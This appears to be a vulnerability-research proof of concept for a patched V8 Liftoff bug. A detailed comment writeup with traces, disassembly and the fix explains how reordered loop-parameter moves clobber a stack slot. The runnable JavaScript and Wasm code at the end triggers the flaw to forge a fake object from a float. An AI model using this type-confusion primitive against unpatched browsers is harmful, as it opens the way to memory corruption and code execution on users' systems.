//POC modified from public regression test
//https://chromium.googlesource.com/v8/v8/+/4ddcbf22b7be0a30c88c1485f0b5e4863d9aefd7/test/mjsunit/regress/wasm/regress-360700873.js
//
//Author: @mistymntncop
//Many thanks to @buptsb for the helpful debugging flags :-) !
//
// Build d8 using:
// a) Run once
//    git checkout "97975764885482e92e53f65352446b5c4ea68f20^"
//    gclient sync
//    gn gen ./out/x64.debug
//    gn gen ./out/x64.release
//
// b) 
//    Debug Build:
//    ninja -C ./out/x64.debug d8
//
//    Release Build:
//    ninja -C ./out/x64.release d8
//
//c:\path\to\v8\out\x64.release\d8 --allow-natives-syntax poc.js
//
//Liftoff
//======================
//https://v8.dev/blog/liftoff
//https://docs.google.com/document/d/1FQt2uKwn7ssut9ybIcRjaydZte6KpBlaA-C5r8PyiFw/edit
//
//Liftoff is a fast compiler for compiling Wasm to assembly. It is a single pass compiler.
//
//"Liftoff is a simple code generator, and fast. It performs only one pass over the opcodes of a function, 
//generating code for each opcode, one at a time".
//
//"The function body decoder does a single pass over the raw WebAssembly bytes and interacts with the subsequent stage 
//via callbacks, so code generation is performed while decoding and validating the function body."
// 
//Wasm instructions may produce/consume values which are pushed/popped onto a virtual operand stack during compilation.
//
//"WebAssembly code consists of sequences of instructions. Its computational model is based on a stack machine in that 
//instructions manipulate values on an implicit operand stack, consuming (popping) argument values and producing or returning 
//(pushing) result values." (https://webassembly.github.io/spec/core/syntax/instructions.html)
//
//"Liftoff maintains metadata about the operand stack in order to know where the inputs of each operation are currently stored. 
//This virtual stack exists only during compilation. WebAssembly’s structured control flow and validation rules guarantee that 
//the location of these inputs can be statically determined. Thus an actual runtime stack onto which operands are pushed and popped 
//is not necessary. During execution, each value on the virtual stack will either be held in a register or be spilled to the physical 
//stack frame of that function. For small integer constants (generated by i32.const), Liftoff only records the constant’s value in 
//the virtual stack and does not generate any code. Only when the constant is used by a subsequent operation, it is emitted or 
//combined with the operation, for example by directly emitting a addl <reg>, <const> instruction on x64. This avoids ever loading 
//that constant into a register, resulting in better code."
//
//Virtual operands are represented by Varstate objects.
//A VarState consists of:
//   1) a Location variable which is defines where that variable lives when it is lowered to assembly. This could
//      be either on the program stack, a constant embedded inline in an assembly instruction, or in a machine register. 
//   2) a ValueKind variable which defines the bitwidth of the variable (either 32 or 64 bit). 
//   3) either a LiftoffRegister variable which defines which machine register this wasm variable uses 
//      or a int32_t which defines which stack offset this variable is stored at.
//   4) a int variable which stores the "spill_offset_" location where this variable should be stored when 
//      registers are spilled to the program stack.
//
//The concrete location of a operand may change during compilation. For example, the compilation of a wasm instruction may cause
//operands previously stored in registers to be spilled onto the program stack. 
//
//The CacheState class represents the state of the virtual operand stack after compilation of a wasm instruction. It contains
//a dynamic array of VarState objects ("stack_state"), and also maintains information of used/spilled registers, etc.
//
//The LiftoffAssembler class is responsible for implementing a dynamic assembler. It contains a CacheState variable ("cache_state_") 
//containing the current state of the virtual operand stack. The current "cache_state_" may be snapshotted by wasm instructions
//(e.g. block, loop).
//
//The "spill_offset_" location of each VarState is calculated based on the current "spill_offset_" on the top of the "cache_state_" 
//operand stack ("stack_state").
//
//The LiftoffCompiler class is responsible for implementing code for the compilation of each wasm instruction. 
//It contains a LiftoffAssembler variable ("asm_").
//
//
//
//
//Loops
//======================
//loop, end and branch (br, br_if, br_table) wasm instructions can used to implement loops for a wasm program.
//We will only consider the unconditional branch instruction (br) for this writeup.
//
//loop - "The loop statement creates a label that can later be branched to with a br.
//        The loop instruction doesn't loop by itself; you need to branch to it to actually create a loop.". 
//
//       
//       During compilation of the "loop" instruction a copy of the current "cache_state_" is saved 
//       (via "LiftoffAssembler::CacheState::Split") to a variable called "label_state" which 
//       will later on be used during compilation of the branch instruction to move values to their
//       expected locations as required by the loop.
//
//
//       void Loop(FullDecoder* decoder, Control* loop) {
//         // Before entering a loop, spill all locals to the stack, in order to free
//         // the cache registers, and to avoid unnecessarily reloading stack values
//         // into registers at branches.
//         // TODO(clemensb): Come up with a better strategy here, involving
//         // pre-analysis of the function.
//         __ SpillLocals();
//   
//         __ PrepareLoopArgs(loop->start_merge.arity);
//   
//         // Loop labels bind at the beginning of the block.
//         __ bind(loop->label.get());
//   
//         // Save the current cache state for the merge when jumping to this loop.
//         loop->label_state.Split(*__ cache_state());
//   
//         PushControl(loop);
//   
//         if (!dynamic_tiering()) {
//           // When the budget-based tiering mechanism is enabled, use that to
//           // check for interrupt requests; otherwise execute a stack check in the
//           // loop header.
//           StackCheck(decoder, decoder->position());
//         }
//       }
//
//
//
//end - "end is used to end a block, loop, if, or else"
//
//br - "The br statement branches to a loop, block, or if.".
//
//       The "br" instruction uses the value locations saved in the "label_state" variable
//       to move (via "LiftoffAssembler::MergeStackWith") the "current_state_" values to 
//       their expected locations as required by the loop.
//
//       void BrImpl(FullDecoder* decoder, Control* target) {
//         if (dynamic_tiering()) {
//           if (target->is_loop()) {
//             DCHECK(target->label.get()->is_bound());
//             int jump_distance = __ pc_offset() - target->label.get()->pos();
//             TierupCheck(decoder, decoder->position(), jump_distance);
//           } else {
//             // To estimate time spent in this function more accurately, we could
//             // increment the tiering budget on forward jumps. However, we don't
//             // know the jump distance yet; using a blanket value has been tried
//             // and found to not make a difference.
//           }
//         }
//         if (target->br_merge()->reached) {
//           __ MergeStackWith(target->label_state, target->br_merge()->arity,
//                             target->is_loop() ? LiftoffAssembler::kBackwardJump
//                                               : LiftoffAssembler::kForwardJump);
//         } else {
//           target->label_state =
//               __ MergeIntoNewState(__ num_locals(), target->br_merge()->arity,
//                                    target->stack_depth + target->num_exceptions);
//         }
//         __ jmp(target->label.get());
//       }
//
//
//
//"Blocks (if, block, loop) in WebAssembly introduce control merges, since code can branch to any parent block, and 
//if-blocks can be skipped. These merge points can be reached from different stack states. Following code, however, 
//has to assume a specific stack state to generate code. Thus, Liftoff snapshots the current state of the virtual 
//stack as the state which will be assumed for code following the new block (i.e. when returning to the control 
//level where we currently are). The new block will then continue with the currently active state, potentially 
//changing where stack values or locals are stored: some might be spilled to the stack or held in other registers. 
//When branching to another block or ending a block (which is the same as branching to the parent block), Liftoff
//must generate code that adapts the current state to the expected state at that point, such that the code emitted 
//for the target we branch to finds the right values where it expects them"
//
//
//
//
//Multi-value Parameters
//=======================
//"Multi-value is a proposed extension to core WebAssembly that enables functions to return many values"
//For more information please refer to this mozilla blog post which describes the reasons why this extension 
//was added to wasm.
//  https://hacks.mozilla.org/2019/11/multi-value-all-the-wasm/
//
//To support multi-value wasm, the "block", "if" and "loop" wasm instructions had to be modified to accept
//multiple values as parameter inputs. This is relevant to our vuln which is related to multi-value "loop" parameters.
//
//https://chromium-review.googlesource.com/c/v8/v8/+/712578
//The introduction of multi-value parameters means that the "loop" instruction can now consume a number of
//parameters. When we jump to the start of a loop it is assumed that the loop parameters should be contained in 
//their expected value locations. The vulnerability manifests during the population of the loop parameters by  
//the "br" instruction.
//
//The "LiftoffAssembler::MergeStackWith" function will merge the current "cache_state_" with the "target" state from 
//the loop. In particular it moves values to the correct block/loop parameter locations using the "Transfer" function 
//of ParallelMove utility class.
//
//void LiftoffAssembler::MergeStackWith(CacheState& target, uint32_t arity,
//                                      JumpDirection jump_direction) {
//  // Before: ----------------|----- (discarded) ----|--- arity ---|
//  //                         ^target_stack_height   ^stack_base   ^stack_height
//  // After:  ----|-- arity --|
//  //             ^           ^target_stack_height
//  //             ^target_stack_base
//  uint32_t stack_height = cache_state_.stack_height();
//  uint32_t target_stack_height = target.stack_height();
//  DCHECK_LE(target_stack_height, stack_height);
//  DCHECK_LE(arity, target_stack_height);
//  uint32_t stack_base = stack_height - arity;
//  uint32_t target_stack_base = target_stack_height - arity;
//  ParallelMove parallel_move{this};
//  ...
//  for (uint32_t i = 0; i < arity; ++i) {
//    parallel_move.Transfer(target.stack_state[target_stack_base + i],
//                           cache_state_.stack_state[stack_base + i]);
//  }
//  ...
//
//Parallel Move 
//=======================
//The ParallelMove class allows the caller to perform a group of multiple moves 
//in any order without having to worry about registers being clobbered.
//
//"ParallelMove is a utility class that encodes multiple moves from registers to
// registers (`RegisterMove`), constants to registers (`RegisterLoad` with
// `LoadKind::kConstant`), or stack slots to registers (other
// `RegisterLoad`s)."
//
//When performing multiple moves the ordering of those moves must be correctly chosen to
//prevent register values from being prematurely clobbered. When moving a value to a 
//register destination we must consider that that register may be used as a source for 
//any of the remaining moves. The following move ordering is used by the parallel move algorithm
//to prevent register clobbering.
//
//1. Moves from any source (stack, constant, register) to stack destinations.
//2. Moves from register sources to register destinations.
//3. Moves from stack, constant sources to register destinations.
//
//The parallel move utility defines two classes RegisterMove and RegisterLoad. RegisterMove 
//considers moves from register sources to register destinations. RegisterLoad considers moves
//from non-register sources (stack, constant) to register destinations. 
//
//While moves to stack destinations are emmitted immediately by the assembler, moves from either 
//RegisterMove/RegisterLoad are deferred. This is implemented by appending RegisterMove/RegisterLoad 
//operations to lists and only emitting those actual instructions at a later time.
//
//"Code is actually emitted to the underlying `LiftoffAssembler` only at the
// end via `Execute` or implicitly in the destructor."
//
//
//Vulnerability
//=====================
//The problem is that the ParallelMove utility only prevents registers from being clobbered it does
//not also prevent stack locations from being clobbered.
//
//Remember that moves to register destinations from stack sources are deferred until after all moves
//to stack destinations. This means that potentially the stack source could have been clobbered 
//by previous moves resulting in the register having the wrong value assigned to it. This gives the 
//attacker a very powerful type confusion primitive.
//
//
//Wasm POC
//======================
//Given our current understanding of the vulnerability we will now study a POC (WAT syntax) to help us 
//understand how this vulnerability may be triggered. This POC is based on the following regression test:
//https://chromium.googlesource.com/v8/v8/+/4ddcbf22b7be0a30c88c1485f0b5e4863d9aefd7
//
//(module
//  (global $global0 (import "m" "global0") (mut f64))
//  (func $a0 (import "m" "a") (param externref f32 f32 f64 funcref))
//  (elem declare func $a0)
//  (func (export "main")
//    ref.null extern                               [1] Creates 1 value stored in the rax register 
//    try (result f32 f32 f64 funcref)                                           
//      f32.const 0                                 [2] Creates 4 values in registers
//      f32.const 0                                 | 
//      f64.const 0                                 | 
//      ref.null func                              _|                                                 
//    end                                           [3] Spills all 4 values created inside the try block onto the program stack
//    loop (param externref f32 f32 f64 funcref)    [4] Prepares loop parameters (5 values), saves current "cache_state_"
//      call $a0                                    [5] Consumes 5 values passing them to a JS function
//                                                  
//      i64.const 0                                 [6] Creates 2 dummy values, consumes 2 spill stack slots
//      i64.const 0                                _|  
//                                                  
//      ref.null extern                             [7] Creates 4 new values in registers
//      f32.const 30                                | 
//      f32.const 50                                | 
//      global.get $global0                        _| 
//      ref.func $a0                                [8] Creates 1 value in a register and spills previous 4 values in registers to program stack 
//                                                  
//      br 0                                        [9] Branches back to loop start, moves 5 values to expected loop parameter locations
//    end                           
//  )             
//)
//
//The loop requires 5 values as parameters. We create 5 values to populate the loop parameters. The first value is stored 
//in a register and the remaining 4 values are stored on the program stack. This is achieved by placing the last 4 values
//in a try block which ends up spilling them to the stack (via "LiftoffAssembler::MergeIntoNewState").
//
//The locations (stack/reg/constant) of these 5 values are then updated by "LiftoffAssembler::PrepareLoopArgs" to meet 
//the loop parameter requirements (e.g. constants are changed to registers). These final locations are the expected locations
//of the loop parameters. A snapshot of the "cache_state_" is saved to the loop's associated Control struct.
//
//Inside the loop we call an imported function which consumes the 5 values and passes them to a JS function.
//
//We then create 2 dummy i64.const values which consumes 2 spill stack slots. Subsequent stack values will be pushed down.
//
//We create 5 values to be accepted by the loop parameter. The 4th value is a f64 value read from a global - this
//value will pollute the 1st loop parameter. The 5th value is a "funcref" which ends up spilling the previous 4 values to 
//the stack (via "LiftoffAssembler::SpillAllRegisters").
//
//We branch back to the loop. The current 5 values on the top of the operand stack are used to populate the loop parameters.
//They must be moved to the locations expected by the loop parameters (stored in the loops cache_state snapshot).
//
//
//
//Wasm Analysis
//=====================
//The following command line arguments will be supplied to d8 to analyze this POC.
//
//c:\path\to\v8\out\x64.debug\d8 --allow-natives-syntax --trace-liftoff --trace-wasm-decoder poc.js
//
//The --allow-natives-syntax flag allows us to use the special native syntax debugging functions
//The --trace-liftoff flag shows us the state of the virtual operand stack after each instruction
//The --trace-wasm-decoder flag interleaves the virtual operand stack states with the corresponding Wasm instructions
//
//
//[]; []
//  @1        #ref.null                      | B0 |  n
//[]; [ref null:rax]
//  @3        #try                           | B0T4 |  n
//[]; []; [ref null:rax]
//  @5        #f32.const                     | B0T4 |  n f
//[]; []; [ref null:rax, f32:xmm0]
//  @10       #f32.const                     | B0T4 |  n f f
//[]; []; [ref null:rax, f32:xmm0, f32:xmm1]
//  @15       #f64.const                     | B0T4 |  n f f d
//[]; []; [ref null:rax, f32:xmm0, f32:xmm1, f64:xmm2]
//  @24       #ref.null                      | B0T4 |  n f f d n
//[]; []; [ref null:rax, f32:xmm0, f32:xmm1, f64:xmm2, ref null:rcx]
//[]; [ref null:rax, f32:s0x2c, f32:s0x30, f64:s0x38, ref null:s0x40]; [ref null:rax, f32:xmm0, f32:xmm1, f64:xmm2, ref null:rcx]
//  @26       #end                           | B0 |  n f f d n
//[]; [ref null:rax, f32:s0x2c, f32:s0x30, f64:s0x38, ref null:s0x40]
//  @27       #loop                          | B0L5-0 |  n f f d n
//[]; [ref null:rax, f32:s0x2c, f32:s0x30, f64:s0x38, ref null:s0x40]; [ref null:rax, f32:s0x2c, f32:s0x30, f64:s0x38, ref null:s0x40]
//  @29       #call                          | B0L5-0 |
//[]; [ref null:rax, f32:s0x2c, f32:s0x30, f64:s0x38, ref null:s0x40]; []
//  @31       #i64.const                     | B0L5-0 |  l
//[]; [ref null:rax, f32:s0x2c, f32:s0x30, f64:s0x38, ref null:s0x40]; [i64:c0]
//  @33       #i64.const                     | B0L5-0 |  l l
//[]; [ref null:rax, f32:s0x2c, f32:s0x30, f64:s0x38, ref null:s0x40]; [i64:c0, i64:c0]
//  @35       #ref.null                      | B0L5-0 |  l l n
//[]; [ref null:rax, f32:s0x2c, f32:s0x30, f64:s0x38, ref null:s0x40]; [i64:c0, i64:c0, ref null:rax]
//  @37       #f32.const                     | B0L5-0 |  l l n f
//[]; [ref null:rax, f32:s0x2c, f32:s0x30, f64:s0x38, ref null:s0x40]; [i64:c0, i64:c0, ref null:rax, f32:xmm0]
//  @42       #f32.const                     | B0L5-0 |  l l n f f
//[]; [ref null:rax, f32:s0x2c, f32:s0x30, f64:s0x38, ref null:s0x40]; [i64:c0, i64:c0, ref null:rax, f32:xmm0, f32:xmm1]
//  @47       #global.get                    | B0L5-0 |  l l n f f d
//[]; [ref null:rax, f32:s0x2c, f32:s0x30, f64:s0x38, ref null:s0x40]; [i64:c0, i64:c0, ref null:rax, f32:xmm0, f32:xmm1, f64:xmm2]
//  @49       #ref.func                      | B0L5-0 |  l l n f f d r
//[]; [ref null:rax, f32:s0x2c, f32:s0x30, f64:s0x38, ref null:s0x40]; [i64:c0, i64:c0, ref null:s0x38, f32:s0x3c, f32:s0x40, f64:s0x48, ref:rax]
//  @51       #br                            | B0L5-0* |
//  @53       #end                           | B0# |
//  @54       #end                           |
//  @54       #(implicit) return             |  |
//
//We will focus on the "cache_state_" after the "loop" and "br" instructions
//
// #br [i64:c0, i64:c0,            ref null:s0x38, f32:s0x3c,    f32:s0x40,        f64:s0x48,     ref:rax        ]
// #loop                          [ref null:rax,   f32:s0x2c,    f32:s0x30,        f64:s0x38,     ref null:s0x40 ]
//
//Remember that the "br" instruction is responsible for populating the loop parameters. It achieves this by moving
//the n (loop paramater count) values on the top of the operand stack into their expected parameter locations.
//
//The following list of moves must be performed by the "br" instruction:
//
//(1)  s0x38 -> rax
//(2)  s0x3c -> s0x2c
//(3)  s0x40 -> s0x30
//(4)  s0x48 -> s0x38
//(5)  rax   -> s0x40
//
//The ParallelMove utility changes the move order so that moves to register destinations occur after the other moves.
//
//(2) s0x3c -> s0x2c
//(3) s0x40 -> s0x30
//(4) s0x48 -> s0x38
//(5) rax   -> s0x40
//(1) s0x38 -> rax            <-- moved to end!!!
//
//Now the 4th move ("s0x48 -> s0x38") is performed before the 1st move ("s0x38 -> rax") meaning that s0x38 has now been clobbered with a 
//attacker controlled value. Essentially the value of the 4th loop parameter gets erroneously copied into the 1st parameter.
//As the 1st loop parameter is expected to be externref type and the 4th parameter is a f64 this results in a very powerful 
//type confusion primitive.
//
//
//Assembly Analysis
//==========================
//c:\path\to\v8\out\x64.debug\d8 --allow-natives-syntax --print_wasm_code_function_index=1 --code-comments poc.js
//
//The --allow-natives-syntax flag allows us to use the special native syntax debugging functions
//The --print_wasm_code_function_index=1 flag prints the assembly instructions of a specified wasm function
//The --code-comments flag interleaves the instructions with corresponding wasm instructions and comments
//
//This output allows us to observe the generated assembly for this wasm program. We can now confirm the
//expected results. Indeed we see that the moves generated by the "br" instruction to populate the loop
//parameters do result in the 1st parameter (rax) being clobbered by the 4th parameter (-0x38).
//
//
//Instructions (size = 348)
//                  frame setup
//000003F716EC1840     0  4531e4               xorl r12,r12
//000003F716EC1843     3  e828f9ffff           call 000003F716EC1170  (jump table)
//000003F716EC1848     8  4881ec30000000       REX.W subq rsp,0x30
//                  [ Check instance data parameter type
//                    [  - DecompressTagged@..\..\src\codegen\x64\macro-assembler-x64.cc:397
//000003F716EC184F     f  8b46ff               movl rax,[rsi-0x1]
//000003F716EC1852    12  4903c6               REX.W addq rax,r14
//                    ]
//000003F716EC1855    15  0fb74007             movzxwl rax,[rax+0x7]
//000003F716EC1859    19  3dbd000000           cmp rax,0xbd
//000003F716EC185E    1e  0f8421000000         jz 000003F716EC1885  <+0x45>
//                    [  - Abort@..\..\src\codegen\x64\macro-assembler-x64.cc:974
//                  Abort message:  - Abort@..\..\src\codegen\x64\macro-assembler-x64.cc:977
//                  Unexpected instance type encountered - Abort@..\..\src\codegen\x64\macro-assembler-x64.cc:978
//                      [ Frame: NO_FRAME_TYPE
//000003F716EC1864    24  b947000000           movl rcx,0000000000000047
//                        [  - PrepareCallCFunction@..\..\src\codegen\x64\macro-assembler-x64.cc:4242
//000003F716EC1869    29  4989e2               REX.W movq r10,rsp
//                          [  - AllocateStackSpace@..\..\src\codegen\x64\macro-assembler-x64.cc:4097
//000003F716EC186C    2c  4883ec28             REX.W subq rsp,0x28
//                          ]
//000003F716EC1870    30  4883e4f0             REX.W andq rsp,0xf0
//000003F716EC1874    34  4c89542420           REX.W movq [rsp+0x20],r10
//                        ]
//000003F716EC1879    39  48b890cb4116f97f0000 REX.W movq rax,00007FF91641CB90
//000003F716EC1883    43  ffd0                 call rax
//                      ]
//                    ]
//                  ]
//                  stack check
//000003F716EC1885    45  493b65a0             REX.W cmpq rsp,[r13-0x60]
//000003F716EC1889    49  0f86f5000000         jna 000003F716EC1984  <+0x144>
//                  ref.null
//000003F716EC188F    4f  498b8538020000       REX.W movq rax,[r13+0x238]
//                  try
//                  f32.const
//000003F716EC1896    56  c5f857c0             vxorps xmm0,xmm0,xmm0
//                  f32.const
//000003F716EC189A    5a  c5f057c9             vxorps xmm1,xmm1,xmm1
//                  f64.const
//000003F716EC189E    5e  c5e957d2             vxorpd xmm2,xmm2,xmm2
//                  ref.null
//000003F716EC18A2    62  498b8d58070000       REX.W movq rcx,[r13+0x758]
//                  end
//000003F716EC18A9    69  c5fa1145d4           vmovss [rbp-0x2c],xmm0
//000003F716EC18AE    6e  c5fa114dd0           vmovss [rbp-0x30],xmm1
//000003F716EC18B3    73  c5fb1155c8           vmovsd [rbp-0x38],xmm2
//000003F716EC18B8    78  48894dc0             REX.W movq [rbp-0x40],rcx
//000003F716EC18BC    7c  e900000000           jmp 000003F716EC18C1  <+0x81>
//                  loop
//                  call
//                  [ Load ref and target for imported function
//                    [  - DecompressProtected@..\..\src\codegen\x64\macro-assembler-x64.cc:418
//000003F716EC18C1    81  8b560b               movl rdx,[rsi+0xb]
//000003F716EC18C4    84  490b95e0010000       REX.W orq rdx,[r13+0x1e0]
//                    ]
//                    [  - DecompressProtected@..\..\src\codegen\x64\macro-assembler-x64.cc:418
//000003F716EC18CB    8b  8b4a13               movl rcx,[rdx+0x13]
//000003F716EC18CE    8e  490b8de0010000       REX.W orq rcx,[r13+0x1e0]
//                    ]
//000003F716EC18D5    95  488b520b             REX.W movq rdx,[rdx+0xb]
//                  ]
//000003F716EC18D9    99  488bf1               REX.W movq rsi,rcx
//000003F716EC18DC    9c  488bca               REX.W movq rcx,rdx
//000003F716EC18DF    9f  488b55c0             REX.W movq rdx,[rbp-0x40]
//000003F716EC18E3    a3  c5fa104dd4           vmovss xmm1,[rbp-0x2c]
//000003F716EC18E8    a8  c5fa1055d0           vmovss xmm2,[rbp-0x30]
//000003F716EC18ED    ad  c5fb105dc8           vmovsd xmm3,[rbp-0x38]
//000003F716EC18F2    b2  ffd1                 call rcx
//                  i64.const
//                  i64.const
//                  ref.null
//000003F716EC18F4    b4  498b8538020000       REX.W movq rax,[r13+0x238]
//                  f32.const
//000003F716EC18FB    bb  41ba0000f041         movl r10,0000000041F00000
//000003F716EC1901    c1  c4c1796ec2           vmovd xmm0,r10
//                  f32.const
//000003F716EC1906    c6  41ba00004842         movl r10,0000000042480000
//000003F716EC190C    cc  c4c1796eca           vmovd xmm1,r10
//                  global.get
//                  [ load instance
//000003F716EC1911    d1  488b75f0             REX.W movq rsi,[rbp-0x10]
//                  ]
//                  [  - DecompressTagged@..\..\src\codegen\x64\macro-assembler-x64.cc:397
//000003F716EC1915    d5  8b4e0f               movl rcx,[rsi+0xf]
//000003F716EC1918    d8  4903ce               REX.W addq rcx,r14
//                  ]
//000003F716EC191B    db  488b4907             REX.W movq rcx,[rcx+0x7]
//                  [  - DecodeSandboxedPointer@..\..\src\codegen\x64\macro-assembler-x64.cc:481
//000003F716EC191F    df  48c1e918             REX.W shrq rcx, 24
//000003F716EC1923    e3  4903ce               REX.W addq rcx,r14
//                  ]
//000003F716EC1926    e6  c5fb1011             vmovsd xmm2,[rcx]
//                  ref.func
//                  [ Call builtin: WasmRefFunc
//000003F716EC192A    ea  488945c8             REX.W movq [rbp-0x38],rax
//000003F716EC192E    ee  c5fa1145c4           vmovss [rbp-0x3c],xmm0
//000003F716EC1933    f3  c5fa114dc0           vmovss [rbp-0x40],xmm1
//000003F716EC1938    f8  c5fb1155b8           vmovsd [rbp-0x48],xmm2
//000003F716EC193D    fd  33c0                 xorl rax,rax
//000003F716EC193F    ff  33db                 xorl rbx,rbx
//000003F716EC1941   101  e80af9ffff           call 000003F716EC1250  (jump table)
//                  ]
//                  br
//                  [ tierup check
//000003F716EC1946   106  4c8b55f0             REX.W movq r10,[rbp-0x10]
//000003F716EC194A   10a  4d8b525f             REX.W movq r10,[r10+0x5f]
//000003F716EC194E   10e  41812a99000000       subl [r10],0x99
//000003F716EC1955   115  0f8837000000         js 000003F716EC1992  <+0x152>
//                  ]
//000003F716EC195B   11b  448b55c4             movl r10,[rbp-0x3c]                <-- loop parameters populated here
//000003F716EC195F   11f  448955d4             movl [rbp-0x2c],r10                
//000003F716EC1963   123  448b55c0             movl r10,[rbp-0x40]                
//000003F716EC1967   127  448955d0             movl [rbp-0x30],r10                
//000003F716EC196B   12b  4c8b55b8             REX.W movq r10,[rbp-0x48]          <-- -0x48 gets moved to -0x38
//000003F716EC196F   12f  4c8955c8             REX.W movq [rbp-0x38],r10          
//000003F716EC1973   133  488945c0             REX.W movq [rbp-0x40],rax          
//000003F716EC1977   137  488b45c8             REX.W movq rax,[rbp-0x38]          <-- -0x38 moved to rax !!!
//000003F716EC197B   13b  488b75f0             REX.W movq rsi,[rbp-0x10]
//000003F716EC197F   13f  e93dffffff           jmp 000003F716EC18C1  <+0x81>
//                  OOL: WasmStackGuard
//000003F716EC1984   144  e887f9ffff           call 000003F716EC1310  (jump table)
//000003F716EC1989   149  488b75f0             REX.W movq rsi,[rbp-0x10]
//000003F716EC198D   14d  e9fdfeffff           jmp 000003F716EC188F  <+0x4f>
//                  OOL: WasmTriggerTierUp
//000003F716EC1992   152  50                   push rax
//000003F716EC1993   153  e8c8f7ffff           call 000003F716EC1160  (jump table)
//000003F716EC1998   158  58                   pop rax
//000003F716EC1999   159  ebc0                 jmp 000003F716EC195B  <+0x11b>
//000003F716EC199B   15b  90                   nop
//
//
//The Patch
//=======================
//https://chromium-review.googlesource.com/c/v8/v8/+/5797073
//
//"[wasm] Spill all loop inputs before entering loop
//
//This avoids having to load the value back into a register if it was
//spilled inside of the loop."
//
//Because all the loop parameters are stored on the program stack we no longer
//have problems with loop parameters being clobbered as the moves do not get 
//reordered.
//
//Before:
//---------
//void LiftoffAssembler::PrepareLoopArgs(int num) {
//  for (int i = 0; i < num; ++i) {
//    VarState& slot = cache_state_.stack_state.end()[-1 - i];
//    if (slot.is_stack()) continue;
//    RegClass rc = reg_class_for(slot.kind());
//    if (slot.is_reg()) {
//      if (cache_state_.get_use_count(slot.reg()) > 1) {
//        // If the register is used more than once, we cannot use it for the
//        // merge. Move it to an unused register instead.
//        LiftoffRegList pinned;
//        pinned.set(slot.reg());
//        LiftoffRegister dst_reg = GetUnusedRegister(rc, pinned);
//        Move(dst_reg, slot.reg(), slot.kind());
//        cache_state_.dec_used(slot.reg());
//        cache_state_.inc_used(dst_reg);
//        slot.MakeRegister(dst_reg);
//      }
//      continue;
//    }
//    LiftoffRegister reg = GetUnusedRegister(rc, {});
//    LoadConstant(reg, slot.constant());
//    slot.MakeRegister(reg);
//    cache_state_.inc_used(reg);
//  }
//}
//
//
//After:
//---------
//void LiftoffAssembler::SpillLoopArgs(int num) {
//  for (VarState& slot :
//       base::VectorOf(cache_state_.stack_state.end() - num, num)) {
//    Spill(&slot);
//  }
//}
//
//

d8.file.execute(`wasm-module-builder.js`);

var conv_ab = new ArrayBuffer(8);
var conv_u32 = new Uint32Array(conv_ab);
var conv_i32 = new Int32Array(conv_ab);
var conv_b64 = new BigInt64Array(conv_ab);
var conv_f64 = new Float64Array(conv_ab);

function i2d(val) {
    conv_u32[0] = val;
    conv_u32[1] = 0;
    return conv_f64[0];
}

function b2d(val) {
    conv_b64[0] = val;
    return conv_f64[0];
}

const builder = new WasmModuleBuilder();
let $sig1 = builder.addType(makeSig([], [kWasmF32, kWasmF32, kWasmF64, kWasmFuncRef]));
let $sig2 = builder.addType(
    makeSig([kWasmExternRef, kWasmF32, kWasmF32, kWasmF64, kWasmFuncRef], []));

let a0 = builder.addImport('m', 'a', $sig2);

let $global0 = builder.addImportedGlobal('m', 'global0', kWasmF64, true);
builder.addDeclarativeElementSegment([a0]);
builder.addFunction('main', kSig_v_v).exportFunc().addBody([
    kExprRefNull, kExternRefCode,
    kExprTry, $sig1,
        ...wasmF32Const(0),
        ...wasmF32Const(0),
        ...wasmF64Const(0),
        kExprRefNull, kFuncRefCode,
    kExprEnd,
    kExprLoop, $sig2,
        kExprCallFunction, a0,

        kExprI64Const, 0,
        kExprI64Const, 0,
        
        kExprRefNull, kExternRefCode,
        ...wasmF32Const(30),
        ...wasmF32Const(50),
        kExprGlobalGet, $global0,
        kExprRefFunc, a0,
        
        kExprBr, 0,
    kExprEnd,
]);

var wasm_code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00, 0x01, 0x13, 0x03, 0x60, 0x05, 0x6F, 0x7D, 0x7D,
    0x7C, 0x70, 0x00, 0x60, 0x00, 0x00, 0x60, 0x00, 0x04, 0x7D, 0x7D, 0x7C, 0x70, 0x02, 0x14, 0x02,
    0x01, 0x6D, 0x07, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x30, 0x03, 0x7C, 0x01, 0x01, 0x6D, 0x01,
    0x61, 0x00, 0x00, 0x03, 0x02, 0x01, 0x01, 0x07, 0x08, 0x01, 0x04, 0x6D, 0x61, 0x69, 0x6E, 0x00,
    0x01, 0x09, 0x05, 0x01, 0x03, 0x00, 0x01, 0x00, 0x0A, 0x39, 0x01, 0x37, 0x00, 0xD0, 0x6F, 0x06,
    0x02, 0x43, 0x00, 0x00, 0x00, 0x00, 0x43, 0x00, 0x00, 0x00, 0x00, 0x44, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xD0, 0x70, 0x0B, 0x03, 0x00, 0x10, 0x00, 0x42, 0x00, 0x42, 0x00, 0xD0,
    0x6F, 0x43, 0x00, 0x00, 0xF0, 0x41, 0x43, 0x00, 0x00, 0x48, 0x42, 0x23, 0x00, 0xD2, 0x00, 0x0C,
    0x00, 0x0B, 0x0B, 0x00, 0x1F, 0x04, 0x6E, 0x61, 0x6D, 0x65, 0x01, 0x05, 0x01, 0x00, 0x02, 0x61,
    0x30, 0x02, 0x05, 0x02, 0x00, 0x00, 0x01, 0x00, 0x07, 0x0A, 0x01, 0x00, 0x07, 0x67, 0x6C, 0x6F,
    0x62, 0x61, 0x6C, 0x30,
]);

let remaining_iterations = 3;
function a() {
    if (--remaining_iterations == 0) throw new Error('finished');
    
    if(remaining_iterations == 1) {
        //for(let i = 0; i < arguments.length; i++) {
        //    %DebugPrint(arguments[i]);
        //} 
        
        console.log("FAKE OBJECT =================\n");
        %DebugPrint(arguments[0]);
    }
}
let global0 = new WebAssembly.Global({value: 'f64', mutable: true});
let imports = {m: {a, global0}};
//let wasm_mod = new WebAssembly.Module(wasm_code);
//let instance = new WebAssembly.Instance(wasm_mod, imports);
let instance = builder.instantiate(imports);
global0.value = b2d(3n);  // bit pattern "0x3", cleared weak pointer
try {
    instance.exports.main();
} catch(err) {}